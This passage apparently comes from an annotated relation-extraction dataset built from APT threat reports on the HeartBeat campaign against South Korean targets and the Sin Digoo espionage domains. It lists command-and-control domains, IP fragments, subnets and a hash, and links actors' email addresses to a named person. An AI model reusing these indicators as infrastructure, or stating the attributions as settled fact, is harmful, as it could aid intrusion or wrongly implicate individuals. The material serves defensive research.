["5/2/2012"], ["Table", "3", ".", "Specific", "dates", "of", "HeartBeat", "campaigns"], ["PAGE", "10", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["We", "did", "not", "obtain", "a", "campaign", "sample", "from", "2010", ".", "However", ","], ["we", "highly", "suspect", "that", "their", "operation", "was", "also", "active"], ["during", "that", "year", ".", "In", "fact", ",", "we", "can", "see", "in", "the", "second", "MD5"], ["above", "that", "the", "sample", "was", "compiled", "in", "December", "24", ",", "2010", "."], ["Also", ",", "it", "is", "possible", "that", "some", "of", "the", "campaign\u2019s", "attacks"], ["may", "not", "have", "been", "escalated", "to", "antivirus", "firms", "by", "infected"], ["users", ",", "or", "simply", "remains", "undiscovered", "."], ["that", "contain", "file", "attachments", "using", "extensions", "such", "as"], ["", ".", "VBS,", "", ".", "BAT,", "", ".", "EXE,", "", ".", "PIF", "and", "", ".", "SCR", "files", "."], ["\u2022", "Avoid", "opening", "email", "attachments", "and", "clicking"], ["embedded", "links", "from", "unknown", "sources"], ["\u2022", "Block", "any", "file", "with", "more", "than", "one", "file", "type", "extension", "."], ["Defending", "against", "the", "HeartBeat"], ["Campaign"], ["\u2022", "When", "a", "computer", "is", "compromised", ",", "isolate", "it"], ["immediately", "from", "the", "network", "."], ["Essential", "components", "of", "defense", "against", "the", "HeartBeat"], ["campaign", "are", "security-related", "policies", "within", "enterprises", "."], ["Once", "an", "attack", "is", "identified", ",", "a", "good", "cleanup", "strategy"], ["should", "focus", "on", "determining", "the", "attack", "vector", "and", "cutting"], ["off", "communications", "with", "the", "C&C", "server", ".", "It", "is", "also", "vital", "to"], ["determine", "the", "scope", "of", "the", "compromise", "and", "assessing", "the"], ["damage", "through", "data", "analysis", "and", "forensics", "."], ["\u2022", "Don\u2019t", "save", "login", "credentials", "on", "the", "local", "computer", "."], ["\u2022", "Configure", "your", "system", "to", "show", "hidden", "files", "and", "folders"], ["and", "display", "file", "extensions", "."], ["The", "following", "best", "practices", "are", "also", "advised:"], ["\u2022", "Disable", "services", "that", "are", "related", "to", "the", "HeartBeat", "RAT"], ["component", "."], ["\u2022", "Enable", "system\u2019s", "firewall"], ["\u2022", "Keep", "software", "and", "operating", "systems", "updated"], ["with", "latest", "patches", "released", "by", "vendors", "to", "address"], ["vulnerabilities", "and", "exploits", "."], ["\u2022", "Block", "unused", "ports", "to", "disallow", "malware", "from"], ["using", "these", "ports", "to", "communicate", "and/or", "enforce"], ["commands", "."], ["\u2022", "Monitor", "network", "connections", "for", "any", "suspicious"], ["connection", "or", "connectivity", "."], ["\u2022", "Regularly", "update", "list", "of", "sites", "that", "are", "trusted", "."], ["\u2022", "Configure", "your", "email", "server", "to", "block", "or", "remove", "email"], ["PAGE", "11", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components"], ["The", "following", "table", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "HeartBeat", "campaign", ".", "Trend", "Micro"], ["recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet"], ["the", "real-time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component"], ["Protection", "Technology"], ["Trend", "Micro", "Solution"], ["HeartBeat", "TCP", "communication", "is", "blocked", "in", "the"], ["network", "layer", "as", "TCP_HBEAT_REQUEST"], ["Web", "Reputation"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["TROJ_DRPBEAT", "and", "BKDR_HBEAT", "variants"], ["File", "Reputation"], ["(Antivirus/Anti-malware)"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["XXX", ".", "XXX.217.123"], ["XXX", ".", "XX.121.84"], ["XX", ".", "XXX.203.122"], ["XX", ".", "XXX.20.103"], ["XXX", ".", "XXX.217.123"], ["XXX", ".", "XX.121.84"], ["XXX", ".", "XXX.178.50"], ["XX", ".", "XXX.15.63"], ["XXX", ".", "XXX.198.93"], ["XXX", ".", "XXX.169.45"], ["XXX", ".", "XXX.178.50"], ["XXX", ".", "XXX.217.123"], ["XX", ".", "XXX.136.115"], ["XXX", ".", "XXX.178.50"], ["XXX", ".", "XXX.4.180"], ["XX", ".", "XXX.203.122"], ["ahnlab", ".", "myfw.us"], ["kissyou01", ".", "myfw.us"], ["kita", ".", "myfw.us"], ["login", ".", "sbs.com.PassAs.us"], ["mail2", ".", "myfw.us"], ["park007", ".", "myfw.us"], ["snrp", ".", "UglyAs.com"], ["www", ".", "banking.com.PassAs.us"], ["www", ".", "huyang.go.kr.PassAs.us"], ["www", ".", "kinu.or.kr.rr.nu"], ["www", ".", "kndu.ac.kr.myfw.us"], ["young03", ".", "myfw.us"], ["Web", ",", "Domain", ",", "and", "IP", "Reputation"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ",", "InterScan"], ["Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["PAGE", "12", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["December", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "HEARTBEAT"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["HEARTBEAT"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "\u201cHeartBeat\u201d", "campaign", "has", "been", "persistently", "pursuing", "government", "agencies", "since", "2009", ".", "The", "samples", "collected", "related", "to", "this", "campaign", "covered"], ["attacks", "seen", "from", "November", "2009", "to", "June", "2012", ",", "although", "majority", "of", "the", "attacks", "were", "seen", "in", "2011", "and", "2012", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["The", "HeartBeat", "campaign", "targets", "South", "Korean", "government", "organizations", "and", "institutions", "like", "political", "parties", ",", "media", "outfits", ",", "a", "national", "policy"], ["research", "institute", ",", "a", "military", "branch", "of", "South", "Korean", "armed", "forces", ",", "a", "small", "business", "sector", "organization", ",", "and", "branches", "of", "the", "South", "Korean"], ["government", "."], ["\u2022", "Operations"], ["The", "1st-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["The", "threat", "actors", "behind", "HeartBeat", "install", "a", "RAT", "in", "system", ".", "The", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which", "is", "actually", "a", "bundled", "file", ".", "The"], ["bundled", "file", "contains", "both", "a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been", "packaged", "together", "using", "a", "binder", "tool", ".", "The", "campaign\u2019s", "decoy"], ["documents", "used", "the", "file", "formats", "", ".", "JPG,", "", ".", "PDF,", "XLS", ",", "and", "HWP", ",", "the", "Korean", "government", "standard", "word", "processor", "format", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["The", "following", "indicators", "suggest", "an", "infection", "by", "the", "HeartBeat", "campaign:", "contiguous", "02H", "bytes", "communication", "in", "the", "network", ",", "the", "presence", "of"], ["certain", "files", "and", "registries", "as", "detailed", "in", "the", "paper", ",", "and", "network", "connections", "to", "certain", "IPs", "and", "domains", ",", "including", "the", "presence", "of", "files", "detected", "as"], ["TROJ_DRPBEAT", "and", "BKDR_HBEAT", "."], ["\u2022", "Relationship", "with", "other", "APT", "Campaigns"], ["This", "attack", "does", "not", "seem", "to", "have", "any", "relationship", "with", "other", "APT", "campaigns", "."], ["PAGE", "13", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["TREND", "MICRO", "INCORPORATED"], ["TREND", "MICRO", "INC", "."], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "14", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Email", "name": "jeno_1980@hotmailcom", "sent_id": 7, "pos": []}, {"old_id": "T2", "type": "Time", "name": "Between 2004 and 2011", "sent_id": 6, "pos": [20, 23]}, {"old_id": "T3", "type": "Person", "name": "Tawnya Grilth", "sent_id": 7, "pos": []}, {"old_id": "T4", "type": "Person", "name": "Eric Charles", "sent_id": 7, "pos": []}, {"old_id": "T5", "type": "Campaign", "name": "Advanced Persistent Threat", "sent_id": 12, "pos": [43, 45]}, {"old_id": "T6", "type": "MalwareFamily", "name": "Enfal", "sent_id": 14, "pos": []}, {"old_id": "T7", "type": "MalwareFamily", "name": "EtenFalcon", "sent_id": 14, "pos": []}, {"old_id": "T8", "type": "MalwareFamily", "name": "RegSubsDat", "sent_id": 21, "pos": []}, {"old_id": "T9", "type": "MalwareFamily", "name": "RegSubDat", "sent_id": 21, "pos": []}, {"old_id": "T10", "type": "MalwareFamily", "name": "Kirpich", "sent_id": 21, "pos": []}, {"old_id": "T11", "type": "Country", "name": "Vietnam", "sent_id": 29, "pos": [9]}, {"old_id": "T12", "type": "Country", "name": "Brunei", "sent_id": 29, "pos": [11]}, {"old_id": "T13", "type": "Country", "name": "Myanmar", "sent_id": 29, "pos": [14]}, {"old_id": "T14", "type": "Malware", "name": "RegSubsDat", "sent_id": 29, "pos": [18]}, {"old_id": "T15", "type": "Malware", "name": "RegSubsDat", "sent_id": 31, "pos": [16]}, {"old_id": "T16", "type": "Malware", "name": "Enfal", "sent_id": 31, "pos": [18]}, {"old_id": "T17", "type": "Region", "name": "Europe", "sent_id": 31, "pos": [8]}, {"old_id": "T18", "type": "Region", "name": "Middle East", "sent_id": 31, "pos": [11, 12]}, {"old_id": "T19", "type": "Country", "name": "China", "sent_id": 33, "pos": [11]}, {"old_id": "T20", "type": "Malware", "name": "GhostNet", "sent_id": 38, "pos": [4]}, {"old_id": "T21", "type": "Campaign", "name": "Sin Digoo", "sent_id": 38, "pos": [18, 19]}, {"old_id": "T22", "type": "Malware", "name": "Murcy", "sent_id": 39, "pos": []}, {"old_id": "T23", "type": "Time", "name": "2011", "sent_id": 38, "pos": [28]}, {"old_id": "T25", "type": "Address", "name": "114248800", "sent_id": 43, "pos": []}, {"old_id": "T26", "type": "Address", "name": "114248960", "sent_id": 43, "pos": []}, {"old_id": "T24", "type": "Address", "name": "123120960", "sent_id": 43, "pos": []}, {"old_id": "T27", "type": "Indicator", "name": "asia-onlineus", "sent_id": 45, "pos": []}, {"old_id": "T28", "type": "Malware", "name": "RegSubsDat", "sent_id": 45, "pos": [1]}, {"old_id": "T29", "type": "Email", "name": "king_public@hotmailcom", "sent_id": 45, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "Cyb3rsleuth", "sent_id": 46, "pos": []}, {"old_id": "T31", "type": "Person", "name": "Wang Liang Chen", "sent_id": 46, "pos": []}, {"old_id": "T32", "type": "Account", "name": "jeno_1980@hotmailcom", "sent_id": 51, "pos": []}, {"old_id": "T33", "type": "Host", "name": "socialupnet", "sent_id": 51, "pos": []}, {"old_id": "T34", "type": "Attacker", "name": "blackhat", "sent_id": 55, "pos": []}, {"old_id": "T35", "type": "Indicator", "name": "jzd", "sent_id": 64, "pos": [17]}, {"old_id": "T36", "type": "Host", "name": "i-tobuycom", "sent_id": 66, "pos": []}, {"old_id": "T37", "type": "Account", "name": "jeno_1980@hotmailcom", "sent_id": 66, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "xxgchappy", "sent_id": 66, "pos": []}, {"old_id": "T39", "type": "Host", "name": "1stsalenet", "sent_id": 68, "pos": []}, {"old_id": "T40", "type": "Account", "name": "xxgchappy@vipsinacom", "sent_id": 68, "pos": []}, {"old_id": "T41", "type": "Indicator", "name": "john twk", "sent_id": 68, "pos": []}, {"old_id": "T42", "type": "Exploit", "name": "hooking Windows API functions", "sent_id": 74, "pos": [42, 45]}, {"old_id": "T43", "type": "Indicator", "name": "Jeno", "sent_id": 79, "pos": []}, {"old_id": "T44", "type": "Address", "name": "12368998", "sent_id": 82, "pos": []}, {"old_id": "T45", "type": "Email", "name": "king_public@hotmailcom", "sent_id": 84, "pos": []}, {"old_id": "T46", "type": "Address", "name": "61515963", "sent_id": 85, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "king-rose", "sent_id": 88, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "Club-tom", "sent_id": 88, "pos": []}, {"old_id": "T49", "type": "Hash", "name": "e211f11c0b28434bf7f1c8fb510fa9ae", "sent_id": 89, "pos": []}, {"old_id": "T50", "type": "Email", "name": "wzy_100@hotmailcom", "sent_id": 94, "pos": []}, {"old_id": "T51", "type": "Address", "name": "123120127153", "sent_id": 94, "pos": []}, {"old_id": "T52", "type": "Exploit", "name": "lankiller", "sent_id": 105, "pos": [12]}, {"old_id": "T53", "type": "Campaign", "name": "Sin Digoo", "sent_id": 113, "pos": [1, 2]}], "labels": [{"old_id": "R1", "r": "P32", "h": 13, "t": 12, "evidence": [29]}, {"old_id": "R2", "r": "P32", "h": 13, "t": 11, "evidence": [29]}, {"old_id": "R3", "r": "P32", "h": 13, "t": 10, "evidence": [29]}, {"old_id": "R4", "r": "P32", "h": 14, "t": 17, "evidence": [31]}, {"old_id": "R5", "r": "P32", "h": 14, "t": 16, "evidence": [31]}, {"old_id": "R6", "r": "P32", "h": 15, "t": 17, "evidence": [31]}, {"old_id": "R7", "r": "P32", "h": 15, "t": 16, "evidence": [31]}, {"old_id": "R8", "r": "P32", "h": 14, "t": 18, "evidence": [31, 32, 33]}, {"old_id": "R9", "r": "P32", "h": 15, "t": 18, "evidence": [31, 32, 33]}, {"old_id": "R10", "r": "P22", "h": 20, "t": 21, "evidence": [38, 39]}, {"old_id": "R11", "r": "P33", "h": 20, "t": 22, "evidence": [38]}, {"old_id": "R12", "r": "P21", "h": 26, "t": 27, "evidence": [45]}, {"old_id": "R13", "r": "P21", "h": 28, "t": 27, "evidence": [45]}, {"old_id": "R14", "r": "P21", "h": 29, "t": 27, "evidence": []}, {"old_id": "R15", "r": "P4", "h": 31, "t": 32, "evidence": [51]}, {"old_id": "R16", "r": "P4", "h": 36, "t": 35, "evidence": [66]}, {"old_id": "R17", "r": "P4", "h": 39, "t": 38, "evidence": [68]}, {"old_id": "R18", "r": "P22", "h": 52, "t": 51, "evidence": []}], "title": ["inputs/txt/201202DellSecureWorksSinDigoo"], "sents": [["The", "Sin", "Digoo", "Affair"], ["URL:http://www", ".", "secureworks.com/research/threats/sindigoo/"], ["Date:", "29", "February", "2012"], ["Author:", "Joe", "Stewart", ",", "Director", "of", "Malware", "Research", ",", "Dell", "SecureWorks", "Counter", "Threat", "Unit", "Research", "Team"], ["\"We", "cannot", "enter", "into", "informed", "alliances", "until", "we", "are", "acquainted", "with", "the", "designs", "of", "our", "neighbors", "and", "the", "plans", "of", "our", "adversaries", ".", "\"", "-", "Sun", "Tzu", ",", "The", "Art", "of", "War"], ["Introduction"], ["The", "story", "of", "the", "Sin", "Digoo", "affair", "begins", "with", "a", "set", "of", "Internet", "domain", "registrations", "dating", "back", "to", "2004", ".", "Between", "2004", "and", "2011", ",", "a", "person", "using"], ["the", "email", "address", "jeno_1980@hotmail", ".", "com", "registered", "several", "domains", "using", "the", "names", "\"Tawnya", "Grilth\"", "and", "\"Eric", "Charles\"", ".", "Curiously", ",", "all", "of"], ["the", "\"Tawnya", "Grilth\"", "domains", "showed", "the", "registrant's", "physical", "address", "to", "be", "a", "post", "office", "box", "in", "the", "fictional/misspelled", "town", "of", "\"Sin", "Digoo\"", ","], ["California", "."], ["Figure", "1", ".", "Characteristics", "of", "domains", "registered", "by", "jeno_1980@hotmail", ".", "com."], ["In", "2006", "and", "2007", ",", "jeno_1980@hotmail", ".", "com", "registered", "a", "number", "of", "domains", "under", "the", "\"Tawnya", "Grilth\"", "alias", "that", "have", "appeared", "repeatedly", "on"], ["reports", "published", "by", "various", "automated", "malware", "analysis", "systems", "and", "antivirus", "websites", ".", "The", "Dell", "SecureWorks", "CTUSM", "research", "team", "examined", "malware", "samples", "using", "these", "domains", "and", "concluded", "that", "these", "domains", "were", "involved", "in", "a", "larger", "pattern", "of", "malware-based", "espionage", ",", "sometimes", "referred", "to", "as", "Advanced", "Persistent", "Threat", "(APT)", "activity", "."], ["Espionage", "malware"], ["There", "are", "two", "primary", "malware", "families", "involved", "with", "the", "Sin", "Digoo", "domains", ".", "One", "is", "known", "as", "\"Enfal\"", ",", "which", "is", "short", "for", "\"EtenFalcon\"", ",", "a"], ["string", "found", "inside", "early", "samples", ".", "The", "involvement", "of", "actors", "using", "this", "malware", "for", "espionage", "was", "first", "detailed", "in", "2010", "in", "a", "joint", "report", "by", "the"], ["Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", ".", "The", "report", ",", "titled", "\"Shadows", "in", "the", "Cloud:", "Investigating", "Cyber", "Espionage"], ["2", ".", "0,\"", "was", "a", "continuation", "of", "research", "from", "an", "earlier", "report", "titled", "\"Tracking", "GhostNet:", "Investigating", "a", "Cyber", "Espionage", "Network", ".", "\"", "A", "later", "report"], ["by", "antivirus", "firm", "Trend", "Micro", "titled", "\"The", "LURID", "Downloader\"", "further", "details", "a", "campaign", "of", "espionage", "by", "this", "malware", "against", "targets", "worldwide", "."], ["Figure", "2", ".", "Sin", "Digoo", "connection", "to", "Enfal", "malware", "."], ["A", "second", "family", "of", "malware", "connecting", "to", "the", "\"Tawnya", "Grilth\"", "domains", "is", "less", "well-known", ",", "although", "a", "couple", "of", "antivirus", "companies", "have"], ["used", "the", "names", "\"RegSubsDat\"", ",", "\"RegSubDat\"", "or", "\"Kirpich\"", "to", "refer", "to", "it", ".", "A", "recent", "variant", "was", "described", "by", "the", "information", "security", "firm", "CyberESI", "in", "a", "2011", "blog", "post", "titled", "\"India-United", "States", "Naval", "Cooperation", ".", "doc", "Analysis", ".", "\"", "Details", "regarding", "the", "earlier", "variant", "used", "in", "the", "Sin", "Digoo"], ["activity", "was", "first", "analyzed", "in", "a", "blog", "posting", "by", "Don", "C", ".", "Weber", "titled", "\"Malware", "Characteristics", "Report", "-", "Trojan", ".", "RegSubsDat.A\"", "on", "his", "Security"], ["Ripcord", "blog", "."], ["Figure", "3", ".", "Sin", "Digoo", "connection", "to", "RegSubsDat", "malware"], ["Although", "windowsaupdate", ".", "com", "is", "not", "a", "\"Tawnya", "Grilth\"", "domain", "according", "to", "the", "WHOIS", "data", ",", "the", "name", "is", "almost", "certainly", "related", "to", "the", "domain", "windowsaupdate", ".", "net,", "especially", "given", "the", "same", "subdomain", "naming", "pattern", "(e", ".", "g.,", "v4", ",", "v12", ",", "v14)", "."], ["Victim", "discovery"], ["CTU", "analysts", "sinkholed", "a", "number", "of", "the", "\"Tawnya", "Grilth\"", "domains", "in", "2011", "and", "2012", ".", "Traffic", "from", "infected", "victim", "computers", "is", "now", "sent", "to"], ["servers", "that", "log", "connections", ",", "gather", "statistics", ",", "and", "notify", "victims", "when", "possible", ".", "The", "initial", "findings", "from", "the", "sinkholing", "activity", "are:"], ["1", ".", "Between", "100", "and", "200", "computers", "located", "in", "Vietnam", ",", "Brunei", ",", "and", "Myanmar", "are", "infected", "by", "RegSubsDat", ".", "Analysis", "of", "the", "IP", "addresses", "connecting", "to", "the", "sinkhole", "show", "that", "many", "are", "government", "ministries", ".", "Additionally", ",", "more", "than", "one", "regional", "petroleum", "company", "and", "a"], ["newspaper", "has", "been", "infected", "."], ["2", ".", "A", "handful", "of", "victim", "computers", "in", "Europe", "and", "the", "Middle", "East", "are", "infected", "by", "RegSubsDat", ",", "Enfal", ",", "and", "one", "other", "unknown", "trojan", ".", "These"], ["computers", "belong", "to", "government", "ministries", "in", "different", "countries", ",", "an", "embassy", ",", "a", "nuclear", "safety", "agency", ",", "and", "other", "business-related"], ["groups", ".", "Additionally", ",", "there", "is", "an", "embassy", "located", "inside", "mainland", "China", "that", "is", "infected", "."], ["The", "CTU", "researchers", "have", "notified", "many", "of", "the", "national", "computer", "security", "incident", "response", "teams", "(CSIRTs)", "in", "the", "countries", "where", "infections"], ["were", "detected", "and", "are", "continuing", "this", "notification", "process", ".", "The", "notifications", "include", "the", "necessary", "information", "to", "locate", "victims", "within", "the"], ["country", ",", "inform", "the", "victims", ",", "and", "mitigate", "the", "infections", "."], ["Link", "to", "RSA", "breach"], ["In", "addition", "to", "the", "GhostNet", "link", ",", "connections", "can", "also", "be", "drawn", "between", "the", "malware", "used", "in", "the", "Sin", "Digoo", "activity", "and", "the", "RSA", "breach", "revealed", "in", "early", "2011", ".", "According", "to", "the", "US-CERT", "EWIN-11-077", "bulletin", ",", "a", "number", "of", "command-and-control", "(C2)", "hostnames", "used", "by", "RegSubsDat", "shared", "three", "different", "IP", "addresses", "at", "different", "points", "in", "time", ",", "with", "one", "of", "the", "hostnames", "known", "to", "be", "part", "of", "the", "RSA", "breach", ".", "This", "C2"], ["hostname", "was", "used", "in", "a", "piece", "of", "malware", "known", "as", "\"Murcy\"", ",", "which", "was", "detailed", "in", "\"Command", "and", "Control", "in", "the", "Fifth", "Domain", ",", "\"", "a", "2012", "report", "by", "Command", "Five", "Pty", "Ltd", "."], ["Figure", "4", ".", "Connection", "between", "the", "RegSubsDat", "malware", "and", "the", "Murcy", "malware", "."], ["All", "three", "IP", "addresses", "belong", "to", "the", "China", "Beijing", "Province", "Network", "(AS4808)", ".", "Although", "the", "RegSubsDat", "and", "Murcy", "C2s", "shared", "these", "IPs", "a"], ["few", "months", "apart", ",", "the", "fact", "that", "three", "IP", "different", "addresses", "at", "the", "same", "ISP", "overlapped", "in", "a", "short", "time", "frame", "seems", "to", "indicate", "shared", "infrastructure", "used", "by", "both", "the", "RSA", "breach", "actors", "and", "other", "actors", "using", "the", "RegSubsDat", "malware", ".", "AS4808", "is", "known", "for", "many", "other", "connections", "to"], ["malware", "and", "is", "considered", "by", "some", "to", "be", "a", "hotbed", "of", "espionage", "C2s", ",", "especially", "the", "123", ".", "120.96.0/19,", "114", ".", "248.80.0/20", "and", "114", ".", "248.96.0/20", "subnets", ".", "These", "subnets", "have", "been", "seen", "in", "DNS", "records", "for", "hundreds", "of", "C2", "hostnames", "for", "dozens", "of", "custom", "malware", "families", ",", "either", "known", "for", "or"], ["suspected", "in", "espionage", "activity", "."], ["The", "RegSubsDat", "asia-online", ".", "us", "domain", "was", "registered", "by", "an", "unknown", "actor", "using", "the", "email", "address", "king_public@hotmail", ".", "com.", "A", "2011", "blog"], ["posting", "by", "\"Cyb3rsleuth\"", "traced", "this", "email", "address", "to", "a", "social", "media", "profile", "created", "by", "a", "person", "living", "in", "Beijing", "named", "\"Wang", "Liang", "Chen", ".", "\""], ["The", "same", "email", "address", "was", "used", "to", "register", "many", "other", "RegSubsDat", "domains", "as", "well", ".", "The", "social", "media", "profile", "for", "king_public@hotmail", ".", "com"], ["has", "since", "been", "deleted", "."], ["Tracking", "Tawnya"], ["The", "same", "type", "of", "open-source", "intelligence", "can", "be", "used", "to", "gather", "information", "about", "the", "jeno_1980@hotmail", ".", "com", "actor", ".", "One", "domain", "registered"], ["by", "jeno_1980@hotmail", ".", "com", "is", "\"socialup", ".", "net\".", "This", "site", "describes", "a", "\"like", "exchange", ",", "\"", "which", "is", "a", "service", "that", "Internet", "marketers", "can", "use", "to", "promote"], ["a", "story", "on", "social", "media", "sites", "like", "Digg", "or", "Reddit", "."], ["Figure", "5", ".", "Screenshot", "of", "the", "socialup", ".", "net", "interface", "."], ["This", "type", "of", "service", "falls", "under", "the", "category", "of", "\"blackhat", "SEO", ",", "\"", "a", "term", "for", "a", "variety", "of", "techniques", "for", "manipulating", "search", "engines", "and", "social"], ["media", "sites", "for", "marketing", "purposes", ".", "These", "methods", "are", "considered", "\"blackhat\"", "because", "they", "usually", "lead", "to", "a", "site", "or", "user", "being", "banned", "from"], ["the", "search", "engine", "or", "social", "media", "sites", "if", "the", "manipulation", "is", "discovered", "."], ["The", "socialup", ".", "net", "website", "has", "been", "repeatedly", "promoted", "on", "blackhat", "SEO", "message", "boards", "by", "various", "personas", ",", "including", "one", "named"], ["\"Tawnya\"", "."], ["Figure", "6", ".", "Example", "of", "\"Tawnya\"", "promoting", "socialup", ".", "net."], ["Once", "a", "user", "signs", "up", "with", "socialup", ".", "net,", "they", "can", "earn", "virtual", "\"coins", ".", "\"", "The", "coins", "can", "be", "used", "to", "promote", "the", "user's", "websites", "or", "social", "media"], ["posts", ",", "either", "by", "viewing", "ads", "or", "liking", "other", "users'", "stories", "and", "links", ".", "A", "user", "can", "also", "buy", "coins", "from", "the", "owner", "of", "socialup", ".", "net", "using", "PayPal", "."], ["Figure", "7", ".", "Example", "of", "interface", "to", "purchase", "coins", "."], ["As", "part", "of", "the", "PayPal", "transaction", ",", "the", "potential", "customer", "can", "see", "the", "payee", "email", "address", ".", "In", "the", "case", "of", "socialup", ".", "net,", "PayPal's", "website", "shows"], ["that", "the", "payment", "for", "the", "socialup", ".", "net", "coins", "is", "sent", "to", "an", "individual", "with", "the", "initials", "jzd", "."], ["Figure", "8", ".", "Order", "summary", "for", "coins", "showing", "payee", "information", "."], ["One", "of", "the", "other", "\"Tawnya", "Grilth\"", "domains", "is", "\"i-tobuy", ".", "com\".", "This", "domain", "was", "registered", "in", "2004", "using", "the", "jeno_1980@hotmail", ".", "com", "email", "address", "and", "\"Sin", "Digoo\"", "location", ",", "but", "the", "nickname", "\"xxgchappy\"", "is", "also", "shown", "in", "the", "registrant", "contact", "data", "."], ["Figure", "9", ".", "Registrant", "contact", "data", "for", "i-tobuy", ".", "com."], ["Another", "domain", "registered", "in", "2004", "using", "the", "\"Sin", "Digoo\"", "location", "was", "\"1stsale", ".", "net\",", "registered", "to", "a", "\"john", "twk\"", "with", "the", "email", "address", "xxgchappy@vip", ".", "sina.com."], ["Figure", "10", ".", "Registrant", "contact", "data", "for", "1stsale", ".", "net."], ["There", "is", "a", "profile", "on", "a", "Chinese", "programmers'", "forum", "for", "an", "\"xxgchappy\"", "user", "who", "has", "posted", "two", "different", "email", "addresses", "in", "different", "messages", "on", "the", "site", ".", "These", "addresses", "are", "xxgchappy@vip", ".", "sina.com", "and"], ["@sina", ".", "com.cn", "(address", "redacted)", ".", "The", "user's", "name", "is", "listed", "on", "the", "forum's", "profile", "page", "for", "\"xxgchappy\"", "and", "contains", "the", "initials", "ZD", "."], ["Figure", "11", ".", "Profile", "for", "xxgchappy", "."], 